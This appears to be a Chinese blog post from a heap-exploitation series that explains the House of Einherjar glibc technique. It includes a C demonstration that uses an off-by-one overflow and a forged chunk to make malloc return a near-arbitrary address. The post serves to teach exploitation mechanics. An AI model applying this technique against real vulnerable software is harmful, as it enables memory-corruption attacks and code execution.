---
title: "heap利用 9/9: House of Einherjar"
date: 2023-02-05T15:36:08+08:00           

tags : [                                    
"heap利用",
]
categories : [                              
"heap利用",
]
keywords : [                                
"heap利用",
]
---



## 1. 概述
这个house不是"The Malloc Maleficarum"的一部分。这种堆利用技术由Hiroki Matsukuma于2016年提出。攻击的目的是使`malloc`返回一个几乎任意一个地址的chunk。与其他攻击不同，这种攻击利用单个字节溢出。受著名的"off by one"影响，存在许多与此相关的软件漏洞。

House of Einherjar 通过利用堆本身存在的溢出漏洞，通过修改、构造chunk的结构来欺骗程序实现攻击目的。具体手段是：通过单字节溢出修改内存中目标chunk的`size`位，并将其`PREV_IN_USE`标志置为0。此外，它会将其`prev_size`（实际已经在其前一个chunk的数据区域中）重写为fake size。当free目标chunk时，`free`函数会发现它的前一个chunk是空闲的，并通过返回内存中的fake size来向前合并。我们可以计算出这个fake size，合并一个几乎任意地址的fake chunk，最终会变成一个大的fake chunk，随后的`malloc`将返回这个fake chunk。

## 2. 示例程序[[完整代码](https://github.com/DhavalKapil/heap-exploitation/blob/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/house_of_einherjar.c)]
```c
struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[32];               // padding
};

struct chunk_structure *chunk1, fake_chunk;     // fake chunk is at 0x7ffee6b64e90
size_t allotedSize;
unsigned long long *ptr1, *ptr2;
char *ptr;
void *victim;

// Allocate any chunk
// The attacker will overflow 1 byte through this chunk into the next one
ptr1 = malloc(40);                              // at 0x1dbb010

// Allocate another chunk
ptr2 = malloc(0xf8);                            // at 0x1dbb040

chunk1 = (struct chunk_structure *)(ptr1 - 2);
allotedSize = chunk1->size & ~(0x1 | 0x2 | 0x4);
allotedSize -= sizeof(size_t);      // Heap meta data for 'prev_size' of chunk1

// Attacker initiates a heap overflow
// Off by one overflow of ptr1, overflows into ptr2's 'size'
ptr = (char *)ptr1;
ptr[allotedSize] = 0;      // Zeroes out the PREV_IN_USE bit

// Fake chunk
fake_chunk.size = 0x100;   // enough size to service the malloc request
// These two will ensure that unlink security checks pass
// i.e. P->fd->bk == P and P->bk->fd == P
fake_chunk.fd = &fake_chunk;
fake_chunk.bk = &fake_chunk;

// Overwrite ptr2's prev_size so that ptr2's chunk - prev_size points to our fake chunk
// This falls within the bounds of ptr1's chunk - no need to overflow
*(size_t *)&ptr[allotedSize-sizeof(size_t)] =
                                (size_t)&ptr[allotedSize - sizeof(size_t)]  // ptr2's chunk
                                - (size_t)&fake_chunk;

// Free the second chunk. It will detect the previous chunk in memory as free and try
// to merge with it. Now, top chunk will point to fake_chunk
free(ptr2);

victim = malloc(40);                  // Returns address 0x7ffee6b64ea0 !!
```
注意：
1. 申请第二个chunk（ptr2）的大小为0xf8。这个大小的好处是确保了实际chunk的大小具有最低有效字节0（忽略标志位）。因此，可以在不改变chunk大小的情况下，将其`PREV_IN_USE`位设置为0。
2. 将`allotedSize`减去`sizeof(size_t)`。`allotedSize`等于整个chunk的大小。但是，实际用于数据的大小要比这个值小`sizeof(size_t)`，也等于堆中的`size`参数。这是因为当前chunk的`size`和`prev_size`不能被用于存储用户数据，但可以使用其下一个chunk的`prev_size`用于存储用户数据。
3. 调整fake chunk的`fd`和`bd`指针，这里为了简单起见，将两个指针都指向chunk本身，这样便可以通过`unlink`的安全检查。